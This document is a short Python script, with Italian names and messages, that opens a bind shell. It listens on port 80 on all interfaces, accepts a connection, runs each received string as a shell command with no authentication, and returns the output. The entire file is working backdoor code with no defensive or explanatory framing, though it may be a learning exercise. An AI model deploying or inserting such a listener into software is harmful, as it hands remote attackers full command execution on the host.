# Server

import socket
import subprocess

def ricevi_comandi(conn):
    while True:
        richiesta = conn.recv(4096)
        risposta = subprocess.run(richiesta.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        data = risposta.stdout + risposta.stderr
        conn.send(data)
        
def sub_server(indirizzo, backlog=1):
    try:
        s = socket.socket()
        s.bind(indirizzo)
        s.listen(backlog)
        print("Server inizializzato e in ascolto...")
    except socket.error as errore:
        print(f"Qualcosa è andato storto...\n{errore}")
        print("Sto tentando di reinizializzare il Server...")
        sub_server(indirizzo, backlog=1)
    conn, indirizzo_client = s.accept()
    print(f"Connessione Server - Client stabilita: {indirizzo_client}")
    ricevi_comandi(conn)

if __name__ == "__main__":
    sub_server(("",80))
